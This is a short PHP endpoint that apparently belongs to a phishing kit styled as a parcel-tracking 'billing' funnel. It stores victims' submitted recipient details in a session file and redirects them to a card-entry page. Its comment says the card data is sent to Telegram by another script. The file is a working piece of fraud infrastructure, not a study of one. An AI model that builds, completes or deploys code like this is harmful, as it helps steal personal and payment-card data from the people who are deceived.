<?php
// Track-funnel billing: save recipient details to session only (Telegram with card in send_card.php)
require_once(__DIR__ . '/../config.php');

header('Content-Type: application/json');

$input = json_decode(file_get_contents('php://input'), true);
$token = $input['token'] ?? '';
$data = $input['data'] ?? [];

if (empty($token)) {
    echo json_encode(['success' => false]);
    exit;
}

$sessions = file_exists(SESSION_FILE) ? json_decode(file_get_contents(SESSION_FILE), true) : [];
if (!is_array($sessions)) {
    $sessions = [];
}
$sessions[$token] = $data;
file_put_contents(SESSION_FILE, json_encode($sessions));

echo json_encode([
    'success' => true,
    'redirect' => './card.php?token=' . urlencode($token),
]);
